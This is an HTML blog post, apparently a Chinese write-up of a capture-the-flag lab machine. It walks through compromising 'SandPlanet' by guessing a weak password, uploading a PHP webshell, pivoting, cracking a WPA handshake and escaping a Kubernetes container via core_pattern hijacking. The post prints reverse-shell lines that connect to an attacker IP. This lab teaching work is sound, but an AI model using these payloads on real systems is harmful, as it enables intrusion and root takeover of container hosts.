@@ -1,0 +1,371 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>the0n3 - SandPlanet 靶机：从 Webshell 到 Kubernetes 容器逃逸</title>
+        <meta name="description" content="靶机信息 靶机名称： SandPlanet 靶机作者：kaada 靶机类型：Linux 来源：MazeSec/QQ公开群 321948805 官网：https://maze-sec.com/ 关键词：Kubernetes容器逃逸、core_pattern劫持、OverlayFS路径泄露、WPA握手包破解、内网未授权横向…">
+    <link rel="canonical" href="https://the0n3.top/posts/d8b036/">
+    <!-- Open Graph -->
+    <meta property="og:title" content="SandPlanet 靶机：从 Webshell 到 Kubernetes 容器逃逸">
+    <meta property="og:description" content="靶机信息 靶机名称： SandPlanet 靶机作者：kaada 靶机类型：Linux 来源：MazeSec/QQ公开群 321948805 官网：https://maze-sec.com/ 关键词：Kubernetes容器逃逸、core_pattern劫持、OverlayFS路径泄露、WPA握手包破解、内网未授权横向…">
+    <meta property="og:url" content="https://the0n3.top/posts/d8b036/">
+    <meta property="og:type" content="article">
+    <meta property="og:site_name" content="the0n3">
+    <meta property="og:locale" content="zh_CN">
+        <meta property="og:image" content="https://the0n3.top/images/maze-SandPlanet/1.png">
+        <!-- Twitter Card -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="SandPlanet 靶机：从 Webshell 到 Kubernetes 容器逃逸">
+    <meta name="twitter:description" content="靶机信息 靶机名称： SandPlanet 靶机作者：kaada 靶机类型：Linux 来源：MazeSec/QQ公开群 321948805 官网：https://maze-sec.com/ 关键词：Kubernetes容器逃逸、core_pattern劫持、OverlayFS路径泄露、WPA握手包破解、内网未授权横向…">
+        <meta name="twitter:image" content="https://the0n3.top/images/maze-SandPlanet/1.png">
+        <script>
+        (function () {
+            try {
+                var key = 'theme';
+                var saved = localStorage.getItem(key);
+                var theme = (saved === 'dark' || saved === 'light') ? saved : 'light';
+                document.documentElement.setAttribute('data-theme', theme);
+                document.documentElement.style.colorScheme = theme;
+            } catch (e) {
+                document.documentElement.setAttribute('data-theme', 'light');
+                document.documentElement.style.colorScheme = 'light';
+            }
+        })();
+    </script>
+    <!-- 使用 GitHub Markdown 样式 -->
+    <link rel="stylesheet" href="/assets/css/github-markdown.css">
+    <link rel="stylesheet" href="/assets/css/site.css">
+    <!-- 功能样式（自动扫描 assets/features/ 目录） -->
+        <link rel="stylesheet" href="/assets/features/code-fold/style.css">
+        <link rel="stylesheet" href="/assets/features/image-enhance/style.css">
+        <link rel="stylesheet" href="/assets/features/reading-progress/style.css">
+        <link rel="stylesheet" href="/assets/features/tax-accordion/style.css">
+        <link rel="stylesheet" href="/assets/css/nav-reveal.css">
+    <link rel="stylesheet" href="/assets/css/search.css">
+    <!-- 代码高亮样式 -->
+    <link rel="stylesheet" href="/assets/prism/prism.css">
+</head>
+<body>
+    <div class="reading-progress" aria-hidden="true">
+        <div class="reading-progress__bar"></div>
+    </div>
+    <header>
+        <nav>
+            <div class="nav-right">
+                                <a href="/">首页</a>
+                                <a href="/archives/">归档</a>
+                                <a href="/categories/">分类</a>
+                                <a href="/tags/">标签</a>
+                                <a href="/friends/">友链</a>
+                                <a href="/about/">关于</a>
+                                <a href="https://www.travellings.cn/go.html">开往</a>
+                                                <button
+                    id="searchTrigger"
+                    class="search-trigger"
+                    type="button"
+                    aria-label="打开搜索"
+                    aria-haspopup="dialog"
+                    aria-controls="searchModal"
+                    title="搜索（/）"
+                >
+                    <span class="search-trigger__label">搜索</span>
+                    <span class="search-trigger__hint">/</span>
+                </button>
+            </div>
+        </nav>
+    </header>
+                <div class="page-layout">
+            <main class="markdown-body">
+                
+<article class="post-content">
+    <h1>SandPlanet 靶机：从 Webshell 到 Kubernetes 容器逃逸</h1>
+    <p>
+        <span class="meta">发布于: 2026-02-24 17:21</span>
+    </p>
+    <div class="post-body">
+        <h2>靶机信息</h2>
+<p>靶机名称： SandPlanet<br>
+靶机作者：kaada<br>
+靶机类型：Linux<br>
+来源：MazeSec/QQ公开群 321948805<br>
+官网：<a href="https://maze-sec.com/">https://maze-sec.com/</a>  </p>
+<p><strong>关键词</strong>：Kubernetes容器逃逸、core_pattern劫持、OverlayFS路径泄露、WPA握手包破解、内网未授权横向</p>
+<p><strong>摘要</strong>：本文记录了MazeSec SandPlanet云原生靶机的渗透全过程。首先从Web入口突破：通过主题关联弱口令admin/sandplanet登录后台，利用文件上传漏洞获取www-data权限Webshell；随后开展内网渗透：发现环境变量指向的未授权跳板服务，直接获取跳板机权限，破解捕获的WPA握手包得到可复用密码，扫描内网后SSH登录目标业务容器；最终完成容器逃逸：利用容器内/proc/sys/kernel/core_pattern可写、OverlayFS挂载路径可映射至宿主机的特性，构造反弹Shell脚本并劫持core_pattern，通过触发程序崩溃以宿主机root权限执行恶意代码，成功获取宿主机控制权。该靶机综合考察了Web渗透、无线密码破解、内网横向及云原生容器逃逸等实战技能，尤其侧重OverlayFS存储特性与Linux内核机制的利用思路。</p>
+<h2>一、信息收集</h2>
+<h3>1. 端口扫描</h3>
+<p>对目标主机进行全端口扫描，使用 <code>-sS</code> 进行 TCP SYN 半开放扫描以提高速度并减少日志记录。</p>
+<blockquote>
+<p>-p- : 扫描所有端口
+-sS : TCP SYN 扫描
+-n  : 不进行 DNS 解析，加快扫描速度</p>
+</blockquote>
+<pre><code class="language-bash">┌──(npc㉿kali)-[~]
+└─$ nmap 192.168.1.18 -p- -sS -n
+
+PORT      STATE SERVICE
+22/tcp    open  ssh
+80/tcp    open  http
+6443/tcp  open  sun-sr-https
+10250/tcp open  unknown
+30080/tcp open  unknown</code></pre>
+<h3>2. Web 目录枚举</h3>
+<p>针对 80 端口进行目录探测，发现关键目录 <code>uploads</code> 和 <code>user.txt</code>。</p>
+<pre><code class="language-bash">┌──(npc㉿kali)-[~]
+└─$ gobuster dir -u http://192.168.1.18 -w medium.txt -x txt,php,html,zip,bak
+===============================================================
+Gobuster v3.8
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.1.18
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.8
+[+] Extensions:              txt,php,html,zip,bak
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/index.php            (Status: 200) [Size: 4894]
+/user.txt             (Status: 200) [Size: 108]
+/uploads              (Status: 301) [Size: 314] [--&gt; http://192.168.1.18/uploads/]
+Progress: 47256 / 1323354 (3.57%)^C</code></pre>
+<p>访问 <code>user.txt</code> 获取 flag 或提示信息：</p>
+<pre><code class="language-bash">┌──(npc㉿kali)-[~]
+└─$ curl http://192.168.1.18/user.txt
+c8e76061320677156906236715617309
+なら林檎の木を植えよう
+So, let's plant an apple tree right here</code></pre>
+<h2>二、Web 渗透与初始访问</h2>
+<h3>1. 登录后台</h3>
+<p>首页存在登录框。经过常规的 SQL 注入和 BurpSuite 爆破（admin账户）测试无果后，转换思路。
+结合首页主题高亮关键词及靶机名称 "sandplanet"，尝试“默认语境口令”组合。</p>
+<blockquote>
+<p>主题强化 + 登录入口 = 默认语境口令候选</p>
+</blockquote>
+<ul>
+<li><strong>用户</strong>：admin</li>
+<li><strong>密码</strong>：sandplanet</li>
+</ul>
+<p>尝试登录成功，进入后台管理界面。</p>
+<p><img src="/images/maze-SandPlanet/1.png" alt="" decoding="async" width="1920" height="879"></p>
+<h3>2. 获取 Webshell</h3>
+<p>登录后发现文件上传功能，测试发现未对 PHP 文件做严格过滤。上传包含反弹 Shell 代码的 PHP 文件。</p>
+<p><strong>Webshell Payload:</strong></p>
+<pre><code class="language-php">&lt;?php system('busybox nc 192.168.1.10 4444 -e bash'); ?&gt;</code></pre>
+<p>Kali 开启监听并触发上传的文件，成功获得 <code>www-data</code> 权限。</p>
+<pre><code class="language-bash">nc -lvnp 4444</code></pre>
+<p><img src="/images/maze-SandPlanet/2.png" alt="" decoding="async" loading="lazy" width="1308" height="466"></p>
+<h2>三、内网横向移动</h2>
+<h3>1. 发现跳板机</h3>
+<p>在获取的 Shell 中检查环境变量（<code>env</code>），发现存在名为 <code>PIVOT</code> 的服务相关信息。尝试连接该跳板机服务的端口（2323），无需认证直接获得了跳板机的 root 权限。</p>
+<p><img src="/images/maze-SandPlanet/3.png" alt="" decoding="async" loading="lazy" width="1370" height="893"></p>
+<pre><code class="language-bash"># 连接内网跳板服务
+nc -nv $PIVOT_SVC_SERVICE_HOST $PIVOT_SVC_SERVICE_PORT</code></pre>
+<p><img src="/images/maze-SandPlanet/4.png" alt="" decoding="async" loading="lazy" width="1534" height="473"></p>
+<h3>2. 流量分析与密码破解</h3>
+<p>在跳板机的家目录 <code>/root</code> 下发现 <code>target_handshake.cap</code> 流量包。使用 <code>aircrack-ng</code> 分析，确认其中包含 WPA 握手包。</p>
+<blockquote>
+<p>Aircrack-ng 能够通过分析捕获的四次握手包来尝试恢复 WPA/WPA2 密码。</p>
+</blockquote>
+<pre><code class="language-bash">┌──(root㉿pivot-deployment-79c65d8699-b92cs)-[~]
+└─# aircrack-ng /root/target_handshake.cap
+Reading packets, please wait...
+Opening /root/target_handshake.cap
+Read 474 packets.
+
+   #  BSSID              ESSID                     Encryption
+
+   1  16:86:25:BF:29:F7  SandPlanet_Core           WPA (1 handshake)
+   2  8E:74:53:E4:DC:F8  SandPlanet_Core           Unknown
+
+Index number of target network ? </code></pre>
+<p><img src="/images/maze-SandPlanet/5.png" alt="" decoding="async" loading="lazy" width="1126" height="813"></p>
+<p>使用 Kali 的 <code>rockyou.txt</code> 字典（取前 5000 行）进行爆破，成功解出密码：<code>princess</code>。</p>
+<pre><code class="language-bash">aircrack-ng -w pass.txt /root/target_handshake.cap </code></pre>
+<p><img src="/images/maze-SandPlanet/6.png" alt="" decoding="async" loading="lazy" width="1101" height="681"></p>
+<h3>3. 内网主机探测</h3>
+<p>利用获取的密码尝试复用攻击。首先探测跳板机所在的网段（10.42.0.171/24）。</p>
+<blockquote>
+<p>Tips: 使用 xargs 并行处理 ping 命令以加快扫描速度。</p>
+<ul>
+<li><code>xargs -P 50</code>: 并行执行 50 个进程</li>
+<li><code>ping -c1 -W1</code>: 发送 1 个包，超时 1 秒</li>
+</ul>
+</blockquote>
+<pre><code class="language-bash">seq 1 254 | xargs -P 50 -I {} bash -c '
+    ping -c1 -W1 10.42.0.{} &gt;/dev/null 2&gt;&amp;1 &amp;&amp; echo "10.42.0.{} is up"
+'</code></pre>
+<p>扫描结果发现多台存活主机（171, 172, 173, 174）。</p>
+<pre><code class="language-plaintext">10.42.0.1 is up
+10.42.0.171 is up
+10.42.0.172 is up
+10.42.0.174 is up
+10.42.0.173 is up</code></pre>
+<p><img src="/images/maze-SandPlanet/7.png" alt="" decoding="async" loading="lazy" width="951" height="294"></p>
+<h3>4. SSH 登录目标</h3>
+<p>针对存活主机扫描 22 端口，发现 <code>10.42.0.173</code> 开放 SSH。
+使用密码 <code>princess</code> 尝试登录，成功进入目标主机。</p>
+<pre><code class="language-bash">for ip in 10.42.0.172 10.42.0.173 10.42.0.174; do
+    timeout 1 bash -c "echo &gt;/dev/tcp/$ip/22" 2&gt;/dev/null &amp;&amp; echo "  [+] $ip:22 SSH open"
+done</code></pre>
+<p><img src="/images/maze-SandPlanet/8.png" alt="" decoding="async" loading="lazy" width="1501" height="726"></p>
+<h2>四、容器逃逸</h2>
+<p>当前环境位于一个 Kubernetes 的 Pod 或 Docker 容器内。我们需要寻找逃逸路径以获取宿主机权限。</p>
+<h3>1. 获取 OverlayFS 挂载信息</h3>
+<p>检查挂载信息，发现 <code>/proc</code> 目录被挂载并且在容器内可写。</p>
+<p><img src="/images/maze-SandPlanet/9.png" alt="" decoding="async" loading="lazy" width="1899" height="746"></p>
+<p>进一步检查 <code>/proc/sys/kernel/core_pattern</code>，确认为可写状态：</p>
+<pre><code class="language-bash">root@target-deployment-6c9b47576f-l7p5r:~# ls -la /proc/sys/kernel/core_pattern
+-rw-r--r-- 1 root root 0 Feb 12 15:03 /proc/sys/kernel/core_pattern</code></pre>
+<p>解读检查挂载点信息 Overlay：</p>
+<ul>
+<li>底层：镜像层（Lowerdir，只读）</li>
+<li>上层：容器层（Upperdir，可写）</li>
+<li>结合：Overlay 文件系统将两者结合，呈现给容器一个统一的文件系统视图</li>
+</ul>
+<p><img src="/images/maze-SandPlanet/10.png" alt="" decoding="async" loading="lazy" width="1920" height="673"></p>
+<p>通过 <code>mount</code> 命令查看到具体的路径：</p>
+<pre><code class="language-plaintext">overlay on / type overlay (rw,relatime,
+# 底层：只读镜像层
+lowerdir=/var/lib/rancher/k3s/agent/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/757/fs:/var/lib/rancher/k3s/agent/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/756/fs:/var/lib/rancher/k3s/agent/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/755/fs:/var/lib/rancher/k3s/agent/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/754/fs:/var/lib/rancher/k3s/agent/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/753/fs:/var/lib/rancher/k3s/agent/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/752/fs:/var/lib/rancher/k3s/agent/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/751/fs:/var/lib/rancher/k3s/agent/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/750/fs:/var/lib/rancher/k3s/agent/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/712/fs
+# 上层：当前容器的可写层
+upperdir=/var/lib/rancher/k3s/agent/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/1709/fs,
+# 工作目录
+workdir=/var/lib/rancher/k3s/agent/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/1709/work</code></pre>
+<p>这意味着：<strong>我们在容器内对文件的写入 (例如 <code>/tmp/111</code>)，实际上是经由 OverlayFS 写入到了宿主机的这个 <code>upperdir</code> 绝对路径下 (例如 <code>/var/lib/.../snapshots/1709/fs/tmp/111</code>)。</strong></p>
+<h3>2. Core Pattern 劫持原理与实施</h3>
+<p><strong>利用条件达成：</strong></p>
+<ol>
+<li><strong>Core Pattern 可写</strong>：该文件定义了当程序崩溃（Coredump）时系统要执行的操作。如果首字符是 <code>|</code>，内核会将崩溃信息管道传输给后面的程序（以宿主机 Root 权限）执行。</li>
+<li><strong>路径已知</strong>：我们通过 OverlayFS 信息获取了容器内文件在宿主机的绝对路径。</li>
+</ol>
+<p><strong>攻击思路：</strong>
+修改 <code>core_pattern</code>，使其指向我们在容器内创建的一个恶意脚本（但使用宿主机的绝对路径）。当人为触发一个程序崩溃时，宿主机内核就会以 ROOT 权限执行这个脚本。</p>
+<p><strong>步骤一：创建反弹 Shell 脚本</strong>
+在容器 <code>/tmp</code> 目录下创建 payload。</p>
+<pre><code class="language-bash">cat &gt; /tmp/.exp &lt;&lt; 'EOF'
+#!/bin/bash
+bash -i &gt;&amp; /dev/tcp/192.168.1.10/9999 0&gt;&amp;1
+EOF
+chmod +x /tmp/.exp</code></pre>
+<p>实际写入路径： <code>$UPPER_DIR/tmp/.exp</code></p>
+<p><strong>步骤二：提取宿主机路径并注入 Core Pattern</strong>
+自动提取 <code>upperdir</code> 绝对路径，并将 <code>core_pattern</code> 指向反弹 shell 脚本。</p>
+<pre><code class="language-bash">UPPER_DIR=$(mount | grep overlay | head -1 | sed -n 's/.*upperdir=\([^,]*\).*/\1/p')
+echo $UPPER_DIR
+echo "|$UPPER_DIR/tmp/.exp" &gt; /proc/sys/kernel/core_pattern</code></pre>
+<p><strong>步骤三：触发崩溃</strong></p>
+<p>Kali 开启监听 9999 端口。在容器内运行一个后台进程并发送 <code>SIGSEGV</code> 信号使其崩溃。</p>
+<pre><code class="language-bash">sleep 5 &amp; kill -SEGV %1</code></pre>
+<p>利用成功，捕获到宿主机 Root Shell，完成逃逸。</p>
+<p><img src="/images/maze-SandPlanet/11.png" alt="" decoding="async" loading="lazy" width="1616" height="432"></p>
+<p><img src="/images/maze-SandPlanet/12.png" alt="" decoding="async" loading="lazy" width="966" height="325"></p>    </div>
+        <div class="post-meta-footer">
+                    <span class="post-meta-item">分类:
+                                    <span>kubernetes</span>
+                            </span>
+                            <span class="post-meta-item">标签:
+                                    <span>#MazeSec</span>
+                            </span>
+            </div>
+    </article>
+
+
+<section class="post-comments" aria-label="Comments">
+    <script src="https://giscus.app/client.js"
+        data-repo="Apursuit/the0n3-blog"
+        data-repo-id="R_kgDORvPPbA"
+        data-category="Announcements"
+        data-category-id="DIC_kwDORvPPbM4C5KAt"
+        data-mapping="pathname"
+        data-strict="0"
+        data-reactions-enabled="1"
+        data-emit-metadata="0"
+        data-input-position="bottom"
+        data-theme="light"
+        data-lang="zh-CN"
+        crossorigin="anonymous"
+        async>
+    </script>
+</section>
+
+            </main>
+                <aside class="post-toc" aria-label="Table of contents">
+        <div class="toc-title">目录</div>
+        <nav class="toc-list"></nav>
+    </aside>
+            </div>
+    
+    <!-- 搜索命令面板：
+         第一版先提供标题、日期、标签搜索，以及键盘导航和快捷键 -->
+    <div id="searchModal" class="search-modal" hidden>
+        <div class="search-modal__overlay" data-search-close></div>
+        <div class="search-modal__dialog" role="dialog" aria-modal="true" aria-labelledby="searchModalTitle">
+            <div class="search-modal__panel">
+                <div class="search-modal__header">
+                    <div class="search-modal__title-group">
+                        <div id="searchModalTitle" class="search-modal__title">搜索文章</div>
+                        <div class="search-modal__subtitle">输入标题、标签或关键词，按 Enter 打开结果</div>
+                    </div>
+                    <button
+                        id="searchClose"
+                        class="search-modal__close"
+                        type="button"
+                        aria-label="关闭搜索"
+                        title="关闭搜索"
+                    >
+                        ×
+                    </button>
+                </div>
+
+                <div class="search-modal__body">
+                    <label class="search-input-wrap" for="searchInput">
+                        <span class="search-input-wrap__icon" aria-hidden="true">⌕</span>
+                        <input
+                            id="searchInput"
+                            class="search-input"
+                            type="text"
+                            placeholder="搜索文章..."
+                            autocomplete="off"
+                            spellcheck="false"
+                        >
+                    </label>
+
+                    <div class="search-help">
+                        <span>/ 打开</span>
+                        <span>↑ ↓ 选择</span>
+                        <span>Enter 打开</span>
+                        <span>Esc 关闭</span>
+                    </div>
+
+                    <div id="searchState" class="search-state" aria-live="polite">输入关键词开始搜索</div>
+                    <div id="searchResults" class="search-results" role="listbox" aria-label="搜索结果"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <button id="backToTop" class="fab fab-top" type="button" aria-label="返回顶部" title="返回顶部">↑</button>
+    <button id="themeToggle" class="theme-toggle" type="button" aria-label="切换主题" title="切换主题"></button>
+    <script src="/assets/js/site.js"></script>
+    <!-- 功能脚本（自动扫描 assets/features/ 目录） -->
+        <script src="/assets/features/code-fold/script.js"></script>
+        <script src="/assets/features/image-enhance/script.js"></script>
+        <script src="/assets/features/reading-progress/script.js"></script>
+        <script src="/assets/features/tax-accordion/script.js"></script>
+        <script src="/assets/js/navReveal.js"></script>
+    <!-- 启动代码高亮及行号显示 -->
+    <script src="/assets/prism/prism.js"></script>
+    <script src="/assets/prism/prism-line-number.js"></script>
+    <!-- 主题切换 -->
+    <script src="/assets/js/ThemeSwitch.js"></script>
+    <!-- 弹簧动画工具（搜索弹窗/灯箱进出场依赖） -->
+    <script src="/assets/js/spring.js"></script>
+    <!-- 搜索功能 -->
+    <script src="/assets/js/fuse.js"></script>
+    <script src="/assets/js/search.js"></script>
+</body>
+</html>
